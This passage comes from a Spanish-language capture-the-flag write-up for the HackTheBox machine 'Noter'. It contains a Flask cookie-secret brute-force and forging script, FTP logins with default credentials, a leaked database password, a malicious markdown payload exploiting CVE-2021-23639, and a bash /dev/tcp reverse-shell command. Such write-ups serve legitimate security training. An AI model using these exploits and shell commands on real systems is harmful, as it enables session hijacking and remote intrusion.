+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'all.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">wordlist</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">wordlist</span>
+
+<span class="c1"># bruteforce cookie
+</span><span class="k">def</span> <span class="nf">bruteforce_cookie</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting Brute force attack'</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">secret</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="n">secret</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">secret</span><span class="p">))</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">serializer</span> <span class="o">=</span> <span class="n">URLSafeTimedSerializer</span><span class="p">(</span>
+                        <span class="n">secret_key</span><span class="o">=</span><span class="n">secret</span><span class="p">,</span>
+                        <span class="n">salt</span><span class="o">=</span><span class="s">'cookie-session'</span><span class="p">,</span>
+                        <span class="n">serializer</span><span class="o">=</span><span class="n">TaggedJSONSerializer</span><span class="p">(),</span>
+                        <span class="n">signer</span><span class="o">=</span><span class="n">TimestampSigner</span><span class="p">,</span>
+                        <span class="n">signer_kwargs</span><span class="o">=</span><span class="p">{</span>
+                                <span class="s">'key_derivation'</span> <span class="p">:</span> <span class="s">'hmac'</span><span class="p">,</span>
+                                <span class="s">'digest_method'</span> <span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span>
+                            <span class="p">}</span>
+                        <span class="p">).</span><span class="n">loads</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">cookie</span><span class="p">)</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Payload : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">serializer</span><span class="p">))</span>
+        <span class="k">except</span> <span class="n">BadSignature</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Secret key : {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">secret</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">secret</span>
+
+<span class="c1"># craft cookie
+</span><span class="k">def</span> <span class="nf">create_cookie</span><span class="p">(</span><span class="n">secret_key</span><span class="p">):</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Creating new cookie with the payload'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">serializer</span> <span class="o">=</span>  <span class="n">URLSafeTimedSerializer</span><span class="p">(</span>
+                            <span class="n">secret_key</span><span class="o">=</span><span class="n">secret_key</span><span class="p">,</span> 
+                            <span class="n">salt</span><span class="o">=</span><span class="s">'cookie-session'</span><span class="p">,</span> 
+                            <span class="n">serializer</span><span class="o">=</span><span class="n">TaggedJSONSerializer</span><span class="p">(),</span> 
+                            <span class="n">signer</span><span class="o">=</span><span class="n">TimestampSigner</span><span class="p">,</span> 
+                            <span class="n">signer_kwargs</span><span class="o">=</span><span class="p">{</span>
+                                <span class="s">'key_derivation'</span><span class="p">:</span><span class="s">'hmac'</span><span class="p">,</span>
+                                <span class="s">'digest_method'</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span>
+                                <span class="p">}</span>
+                            <span class="p">).</span><span class="n">dumps</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">payload</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Cookie : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">serializer</span><span class="p">))</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">'{} ocurred'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">bruteforce_cookie</span><span class="p">(</span><span class="n">load_wordlist</span><span class="p">())</span>
+    <span class="n">create_cookie</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="c1"># References
+#---------------------------------------------------
+#https://github.com/Paradoxis/Flask-Unsign
+#https://github.com/Paradoxis/Flask-Unsign-Wordlist
+</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script y dependencias en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Noter/brute-force_cookie">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ahora solo le pasamos los respectivos parámetros y logramos obtener la cookie del usuario <code class="language-plaintext highlighter-rouge">blue</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="go">❯ python3 brute_force_cookie.py -h
+usage: brute_force_cookie.py [-h] -cookie COOKIE -payload PAYLOAD
+
+Brute force attack "Secret key" of a Flask session cookie by default
+
+optional arguments:
+  -h, --help        show this help message and exit
+  -cookie COOKIE    session cookie to crack
+  -payload PAYLOAD  new payload to create a valid session cookie ( '{"key":"value"}' )
+❯ python3 brute_force_cookie.py -cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFyc3MifQ.YtOJZw.Fy6nzvuXjW_P69IauxCp1WuHZbU -payload '{"logged_in":true,"username":"blue"}'
+[↑] Starting Brute force attack: ********
+[*] Payload : {'logged_in': True, 'username': 'marss'}
+[+] Secret key : ********
+[.] Creating new cookie with the payload: {"logged_in":true,"username":"blue"}
+[+] Cookie : eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtOJ7g.ArNZWl3Agmq5rPAt4QJAz6ybBIs
+</span></pre></table></code></div></div><p>Ahora solo copiamos la nueva cookie en la pestaña de <em>storage</em> de las herramientas de desarrollador (como vimos anteriormente), actualizamos y ya estaremos en la sesión del usuario <code class="language-plaintext highlighter-rouge">blue</code>:</p><p><img data-src="/assets/img/htb/writeups/noter/blue_session.png" alt="BLUESession" class="shadow" data-proofer-ignore></p><p>Empezamos a inspeccionar y en Dashboard encontramos una nota con un acordatorio de cosas que hacer antes del fin de semana, y en ella dice <strong>Delete the password file</strong>, pero a que se refiere?, sigamos buscando</p><p>En la sección de notas encontramos una de agradecimiento de parte del usuario <code class="language-plaintext highlighter-rouge">ftp_admin</code> hacia nuestro usuario por adquirir la membresía premium y con ello el acceso a su servicio <strong>FTP</strong>, además de sus respectivas credenciales.</p><p>Sin pensarlo nos dirigimos al puerto <strong>21(FTP)</strong> que obtuvimos en nuestro escaneo y entramos con las credenciales:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre><span class="go">❯ ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:potro): blue
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">229 Entering Extended Passive Mode (|||24962|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
+-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
+226 Directory send OK.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span>get policy.pdf
+<span class="go">local: policy.pdf remote: policy.pdf
+229 Entering Extended Passive Mode (|||54826|)
+150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
+100% |*****************************************************************************************************| 12569        2.59 MiB/s    00:00 ETA
+226 Transfer complete.
+12569 bytes received in 00:00 (108.48 KiB/s)
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">exit</span>
+<span class="go">221 Goodbye.
+</span></pre></table></code></div></div><p>Logramos encontrar un archivo <code class="language-plaintext highlighter-rouge">policy.pdf</code>, así que lo descargamos con el comando <code class="language-plaintext highlighter-rouge">get &lt;file_name&gt;</code> a nuestra máquina para examinarlo y encontramos, como dice su nombre, <strong>La políticas de contraseña de la aplicación Noter</strong></p><p><img data-src="/assets/img/htb/writeups/noter/policies_noter.png" alt="PoliciesNOTER" class="shadow" data-proofer-ignore></p><p>Después de la lectura destacamos el siguiente enunciado:</p><p><img data-src="/assets/img/htb/writeups/noter/default_passwd.png" alt="DeafaultPASSW" class="shadow" data-proofer-ignore></p><p>Observamos que el usuario <code class="language-plaintext highlighter-rouge">blue</code> mantiene el nombre y contraseña con el formato por defecto. Entonces, si logramos entrar entrar con esas credenciales al servicio <strong>FTP</strong>, y además ya que encontramos al usuario administrador del servicio <strong>FTP</strong> de la aplicación <strong>Noter</strong> <code class="language-plaintext highlighter-rouge">ftp_admin</code>, es tan descuidado de no haber cambiado su contraseña?</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre><span class="go">❯ ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:potro): ftp_admin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">229 Entering Extended Passive Mode (|||60125|)
+150 Here comes the directory listing.
+-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
+-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
+226 Directory send OK.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span>mget <span class="k">*</span>
+<span class="go">mget app_backup_1635803546.zip [anpqy?]? y
+229 Entering Extended Passive Mode (|||33048|)
+150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).
+100% |*****************************************************************************************************| 25559      189.43 KiB/s    00:00 ETA
+226 Transfer complete.
+25559 bytes received in 00:00 (101.20 KiB/s)
+mget app_backup_1638395546.zip [anpqy?]? y
+229 Entering Extended Passive Mode (|||8514|)
+150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).
+100% |*****************************************************************************************************| 26298      220.77 KiB/s    00:00 ETA
+226 Transfer complete.
+26298 bytes received in 00:00 (112.80 KiB/s)
+</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">exit</span>
+<span class="go">221 Goodbye.
+</span></pre></table></code></div></div><p>De locos, encontramos dos archivos <code class="language-plaintext highlighter-rouge">.zip</code> de posibles <em>backups</em>, de nuevo los descargamos a nuesta máquina con el comando <code class="language-plaintext highlighter-rouge">mget *</code>, los descomprimimos <code class="language-plaintext highlighter-rouge">7z x &lt;file_name&gt; -o&lt;output_directory&gt;</code> y procedemos a estudiar su contenido</p><p>Después de analizarlos, llegamos a la conclusión que efectivamente son respaldos de la aplicación <strong>Noter</strong>:</p><blockquote><p>En el primer archivo que es de Noviembre01 encontramos de cara unas credenciales de un servidor <code class="language-plaintext highlighter-rouge">MySQL</code> del usuario <code class="language-plaintext highlighter-rouge">root</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="go">  14   │ 
+</span><span class="gp">  15   │ #</span><span class="w"> </span>Config MySQL
+<span class="go">  16   │ app.config['MYSQL_HOST'] = 'localhost'
+  17   │ app.config['MYSQL_USER'] = 'root'
+  18   │ app.config['MYSQL_PASSWORD'] = 'Nildogg36'
+  19   │ app.config['MYSQL_DB'] = 'app'
+  20   │ app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
+  21   │ 
+</span></pre></table></code></div></div><blockquote><p>En el segundo archivo, que es el más actualizado denuevo encontramos otras credenciales de la base de datos:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="go">       |
+</span><span class="gp">  15   │ #</span><span class="w"> </span>Config MySQL
+<span class="go">  16   │ app.config['MYSQL_HOST'] = 'localhost'
+  17   │ app.config['MYSQL_USER'] = 'DB_user'
+  18   │ app.config['MYSQL_PASSWORD'] = 'DB_password'
+  19   │ app.config['MYSQL_DB'] = 'app'
+  20   │ app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
+  21   │ 
+</span></pre></table></code></div></div><p>Podríamos usar la credenciales pero recordemos que al realizar nuestro escaneo no encontramos el puerto por defecto de <code class="language-plaintext highlighter-rouge">MySQL</code> <strong>3306/TCP</strong></p><p>Lo más lógico que podemos hacer ahora es examinar el código de la aplicación y encontrar alguna bracha o fallo que podeamos explotar. Viendo el código observamos una función interesante <code class="language-plaintext highlighter-rouge">export_note_remote()</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre><span class="c1"># Export remote
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note_remote'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="o">@</span><span class="n">is_logged_in</span>
+<span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
+
+            <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="n">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+                    <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
+                    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"node misc/md-to-pdf.js  $'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">' </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="s">"</span> <span class="o">&lt;---------</span> <span class="n">Important</span><span class="err">!</span>
+                    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">)</span>
+
+                    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">):</span>
+
+                        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+                    <span class="k">else</span><span class="p">:</span>
+                        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured while exporting the !"</span><span class="p">)</span>
+
+                <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"Error occured!"</span><span class="p">)</span>
+
+
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+            
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="s">"Error occured while exporting ! (</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
+</pre></table></code></div></div><p>Observamos que se ejecuta el archivo en <code class="language-plaintext highlighter-rouge">Javascript</code> <code class="language-plaintext highlighter-rouge">md-to-pdf.js</code>, lo buscamos en la ruta que indica:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span> <span class="nx">mdToPdf</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">md-to-pdf</span><span class="dl">'</span><span class="p">);</span>
+
+
+<span class="p">(</span><span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="k">await</span> <span class="nx">mdToPdf</span><span class="p">({</span> <span class="na">content</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">},</span> <span class="p">{</span> <span class="na">dest</span><span class="p">:</span> <span class="dl">'</span><span class="s1">./misc/attachments/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.pdf</span><span class="dl">'</span><span class="p">});</span>
+<span class="p">})();</span>
+</pre></table></code></div></div><p>Por el nombre podemos deducir que se trata, en resumen <code class="language-plaintext highlighter-rouge">md-to-pdf</code> es una herramienta <strong>CLI (Command Line Interface)</strong> que permite convertir archivos de formato <em>markdown</em> a <em>pdf</em>.</p><p>Primero debemos tener en cuenta que al crear un proyecto e instalar las dependencias y librerías necesarias en la carpeta <code class="language-plaintext highlighter-rouge">node_modules</code>, también se crea un archivo <code class="language-plaintext highlighter-rouge">package.json</code> en el cúal se almacena el nombre de nuestro proyecto, como también todas las versiones de los paquetes que depende. Además, existe otro archivo llamado <code class="language-plaintext highlighter-rouge">package_lock.json</code> que tiene el mismo propósito que el anterior pero con la diferencia que al momento que alguien clone nuestro proyecto, este instalará las dependencias con las versiones que están en el archivo a pesar de que existan nuevas versiones</p><p>Con los conceptos más claro ya procedemos a analizar el pequeño código:</p><blockquote><p>En la primera línea solo importa el módulo <code class="language-plaintext highlighter-rouge">md-to-pdf</code>, osea la herramienta de la que hablabamos</p></blockquote><blockquote><p>Luego usa una <strong>arrow function ()=&gt;</strong> asíncrona <strong>async / await</strong> (podemos tomarlo como una ejecución en paralelo), que usa el módulo <code class="language-plaintext highlighter-rouge">md-to-pdf</code></p></blockquote><blockquote><p>Para usar este módulo le pasa como contenido el texto de la nota que queremos importar <code class="language-plaintext highlighter-rouge">$'{r.text.strip()}'</code> y lo guarda en la ruta <code class="language-plaintext highlighter-rouge">./misc/attachments</code> con un número random como nombre y de tipo <code class="language-plaintext highlighter-rouge">.pdf</code></p></blockquote><p>Ahora el punto es como podemos explotar eso. Como mencioné antes, podemos saber la versión exacta de la herramienta <code class="language-plaintext highlighter-rouge">md-to-pdf</code> que se está usando, así que revisamos en el archivo <code class="language-plaintext highlighter-rouge">package_lock.json</code> y la encontramos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="go">❯ cat package-lock.json | grep md-to-pdf -A 1
+    "md-to-pdf": {
+      "version": "4.1.0", &lt;-------- Vulnerable?
+      "resolved": "https://registry.npmjs.org/md-to-pdf/-/md-to-pdf-4.1.0.tgz",
+      "integrity": "sha512-5CJVxncc51zkNY3vsbW49aUyylqSzUBQkiCsB0+6FlzO/qqR4UHi/e7Mh8RPMzyqiQGDAeK267I3U5HMl0agRw==",
+</span></pre></table></code></div></div><p>Con la version procedemos a buscar vulnerabilidades y encontramos el <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23639"><strong>CVE-2021-23639</strong></a> el cuál nos permite una ejecución remota de comandos gracias a que la librería <em>gray-matter</em> (que permite convertir string un archivo de objetos) se usa por defecto y no se deshabilita el intérprete de comandos <strong>Javascript</strong>, lo cuál nos permite pasar un archivo formato <em>markdown</em> y con su respectiva sintáxis ejecutar código javascript</p><blockquote><p>Archivo <code class="language-plaintext highlighter-rouge">.md</code> malicioso</p></blockquote><div class="language-md highlighter-rouge"><div class="code-header"> <span data-label-text="Markdown"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>❯ cat pwned.md
+---js<span class="sb">
+
+        ((require("child_process")).execSync("echo {b64encoded command} | /usr/bin/base64 -d | /bin/bash"))
+
+</span><span class="p">---
+</span></pre></table></code></div></div><p>En resumen, se usa el módulo <code class="language-plaintext highlighter-rouge">child_process</code> que nos permite iniciar procesos secundarios y usando uno de sus métodos, en este caso <code class="language-plaintext highlighter-rouge">execSync</code>, nos permitira ejecutar comandos</p><blockquote class="prompt-tip"><div><p>Si queremos ejecutar comandos complejos como una <code class="language-plaintext highlighter-rouge">reverse shell</code>, por temas de interpretación de simbolos (&amp;) o comillas (“’’”), es recomendable primero codificar el comando en <code class="language-plaintext highlighter-rouge">base64</code>, luego decodificarlo e interpretarlo con una <code class="language-plaintext highlighter-rouge">bash</code></p></div></blockquote><p>El proceso es sencillo:</p><blockquote><p>Una vez creado este archivo, iremos a la sesión del usuario <code class="language-plaintext highlighter-rouge">blue</code> y como tenemos membresía VIP usaremos la opción <strong>Export Notes</strong></p></blockquote><blockquote><p>Compartimos un <strong>servicio http</strong> para compartir el archivo (e.g ruby -run -e httpd . -p80)</p></blockquote><blockquote><p>Nos pondemos en escucha en el puerto especificado para recibir la shell (e.g nc -lvnp 1234)</p></blockquote><blockquote><p>Luego en el apartado <strong>Export directly from cloud</strong> subiremos nuestro <em>Archivo malicioso</em> (e.g http://ip:port/file_name)</p></blockquote><blockquote><p>Al subir el archivo la máquina usará la función <strong>export_note_remote()</strong>, usará la herramienta <code class="language-plaintext highlighter-rouge">md-to-pdf</code> y con ello ejecutara el comando especificado (reverse shell code)</p></blockquote><p>Especificando como commando un <strong>reverse shell</strong> <code class="language-plaintext highlighter-rouge">'bash -c "bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1"'</code> y siguiendo los pasos anteriores, recibiremos una shell como el usuario <code class="language-plaintext highlighter-rouge">svc</code> y obtenemos la primera flag</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">whoami
+svc
+</span><span class="gp">svc@noter:~/app/web$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
+<span class="gp">find / -name user.txt 2&gt;</span>/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">-rw-r----- 1 root svc 33 Jul 16 20:13 /home/svc/user.txt
+</span></pre></table></code></div></div><blockquote class="prompt-warning"><div><p>No olvidar hacer un tratamiendo completo de la <strong>TTY</strong> para mayor comodidad y movimiento en el sistema</p></div></blockquote><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con un reconocimiento básico del sistema para saber la distribución (Debian, Ubuntu, Fedora) y su versión, la arquitectura (32-bit, 64-bit), en que equipo de la red nos encontramos (máquina víctima, container), que procesos corren por detrás (cron, crontab, jobs), etc</p><p>Por ejemplo, listando las conexiones de entrada o salida en el sistema (o puertos abiertos), logramos observar el famoso puerto <strong>3306(mysql)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
